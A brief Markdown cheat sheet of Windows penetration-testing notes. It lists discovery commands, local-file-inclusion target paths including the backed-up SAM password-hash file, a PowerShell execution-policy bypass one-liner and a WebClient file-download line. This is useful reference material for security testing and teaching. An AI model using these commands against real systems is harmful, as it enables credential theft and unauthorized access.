# windows

## runas

- `/netonly`. For local operations, run as local user; for network operations, use the provided account.

## discovery tactics for windows

- `systeminfo`
- `route print`. show routing table
- `arp -a`. view ARP table
- `netstat -ano`. view open connections

## lfi
- `C:/license.rtf`. OS version
- `C:/WindowsUpdate.log`. current state of windows updates
- `C:/SoftwareDistribution`. previously downloaded windows update patches
- `C:/Windows/system32/config/regback/sam`. stored password hashes
- `C:/Windows/System32/drivers/etc/hosts`. hardcoded network hosts

## tricks

### run powershell command

```
powershell.exe -exec bypass -C "<COMMAND>"
```

### download file

```powershell
(New-Object System.Net.WebClient).DownloadFile(<URL>, <OUTPUT>)
```

### references
- [ss64.com: `runas`](https://ss64.com/nt/runas.html)
- [Windows pentest commands](http://www.networkpentest.net/p/windows-command-list.html)
- [Windows path traversal (important files) cheatsheet](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
